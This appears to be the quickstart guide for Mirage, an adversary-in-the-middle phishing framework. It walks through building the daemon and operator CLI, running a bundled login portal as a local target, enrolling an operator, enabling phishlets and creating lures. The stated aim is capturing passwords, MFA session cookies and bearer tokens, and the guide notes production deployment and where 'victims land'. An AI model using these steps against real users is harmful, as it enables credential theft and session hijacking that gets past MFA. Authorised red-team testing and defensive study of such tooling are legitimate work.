# Mirage Quickstart

This guide covers running both binaries on a single machine for local testing without a real domain or ACME certificates. It uses the bundled target site — a simple login portal with MFA — so you can test the full AiTM pipeline end-to-end without hitting a real site.

## Overview

Mirage is two binaries:

- **`miraged`** — the daemon (proxy, API, DNS)
- **`mirage`** — the operator CLI (talks to miraged over mTLS)

---

## 1. Build

```bash
make build
# produces build/miraged and build/mirage
```

---

## 2. Start the target site

The `examples/target-site/` directory contains a small Flask login portal ("Vault") with email/password and MFA steps — enough to test credential capture and session token capture end-to-end.

```bash
docker compose -f examples/target-site/docker-compose.yml up -d
```

---

## 3. Create directories and config

```bash
mkdir -p /tmp/mirage/{phishlets,data}
cp examples/phishlets/form-login.yaml /tmp/mirage/phishlets/
```

Create `/tmp/mirage/miraged.yaml`:

```yaml
domain: phish.local
external_ipv4: 127.0.0.1
bind_address: 127.0.0.1
data_dir: /tmp/mirage/data
phishlets_dir: /tmp/mirage/phishlets

self_signed: true

api:
  secret_hostname: mgmt.phish.local
```

> Required fields: `domain`, `external_ipv4`, and `api.secret_hostname`. Set `self_signed: true` to skip ACME and use a locally generated CA instead. `bind_address` restricts the listener to `127.0.0.1` so it doesn't conflict with the target site on `127.0.0.2`. In production, omit it to listen on all interfaces.

---

## 4. Add /etc/hosts entries

Since there's no real DNS, point all hostnames at localhost:

```bash
echo "127.0.0.1  login.phish.local  api.phish.local" | sudo tee -a /etc/hosts
echo "127.0.0.2  login.target.local  api.target.local" | sudo tee -a /etc/hosts
```

> The target site binds to `127.0.0.2:443` and the proxy to `127.0.0.1:443`, avoiding port conflicts while keeping both on standard ports.

---

## 5. Start miraged

Allow the binary to bind privileged ports (443, 53) without root, then start it:

```bash
sudo setcap cap_net_bind_service=+ep ./build/miraged
./build/miraged --config /tmp/mirage/miraged.yaml --debug
```

On first run it will:

- Create a TLS CA at `/tmp/mirage/data/ca/mirage-ca.crt`
- Create an mTLS API CA at `/tmp/mirage/data/api-ca.crt`
- Generate an invite token for the first operator
- Load any phishlets found in `phishlets_dir`

Look for the enrollment command in the output:

```
level=INFO msg="enroll with: mirage server add --address 127.0.0.1 --secret-hostname mgmt.phish.local --token <token>"
```

---

## 6. Trust the self-signed CA in your browser

Import `/tmp/mirage/data/ca/mirage-ca.crt` as a trusted CA so the browser doesn't block requests to the phishing hostname.

- **Firefox:** Settings → Privacy & Security → View Certificates → Authorities → Import
- **Chrome:** Settings → Privacy and security → Security → Manage certificates → Authorities → Import

---

## 7. Enroll the operator

In a second terminal, copy and run the enrollment command from the daemon output, adding `--alias local`:

```bash
./build/mirage server add --alias local --address 127.0.0.1 --secret-hostname mgmt.phish.local --token <token>
```

On success you'll see `Enrolled successfully. Server saved as "local".`

---

## 8. Enable the phishlet and create a lure

```bash
# Enable the phishlet on a hostname
./build/mirage phishlets enable form-login --hostname login.phish.local

# Create a lure (redirect URL is where victims land after token capture)
./build/mirage lures create form-login --redirect https://login.target.local/demo-complete
```

Visit the printed lure URL in a browser that trusts the CA. You'll be taken to the standard login form. Sign in with any email and password, then enter any 6-digit code for MFA. Once MFA completes the session token is captured and the session is marked complete:

```bash
./build/mirage sessions list --completed
./build/mirage sessions show <session-id>
```

---

## File layout after first run

```txt
/tmp/mirage/                        # server
├── miraged.yaml
├── phishlets/
│   └── form-login.yaml
└── data/
    ├── data.db                     # SQLite — sessions, lures, operators
    ├── ca/
    │   ├── mirage-ca.crt           # TLS CA — import into browser
    │   └── mirage-ca.key
    ├── api-ca.crt                  # mTLS operator CA
    └── api-ca.key

~/.mirage/                          # operator workstation
├── client.json                     # server config
├── local.crt                       # operator cert (enrolled)
├── local.key                       # operator private key
└── local-ca.crt                    # server's API CA cert
```

---

## Tips

- Phishlet YAML files are hot-reloaded on save — no restart needed.
- Run `./build/miraged --config /tmp/mirage/miraged.yaml validate` to check your config without starting the daemon.
- `./build/mirage` with no subcommand drops into an interactive REPL.
- The CLI `--json` flag outputs raw JSON for scripting.

---

## Next steps

The target site includes two additional login flows you can test with different phishlets.

> **Tip:** Use an incognito window between tests. The proxy sets a session cookie that lasts one week — completed sessions redirect to the real site instead of showing the login page.

- **API login phishlet** — Captures bearer tokens from JSON responses instead of cookies.

  ```bash
  cp examples/phishlets/api-login.yaml /tmp/mirage/phishlets/
  mirage phishlets enable api-login --hostname login.phish.local
  mirage lures create api-login --redirect https://login.target.local/demo-complete
  ```

- **Multi-host phishlet** — Proxies two subdomains (`login` and `api`), demonstrating cross-origin auth and multi-host routing.

  ```bash
  cp examples/phishlets/multi-host.yaml /tmp/mirage/phishlets/
  mirage phishlets enable multi-host --hostname login.phish.local
  mirage lures create multi-host --redirect https://login.target.local/demo-complete
  ```
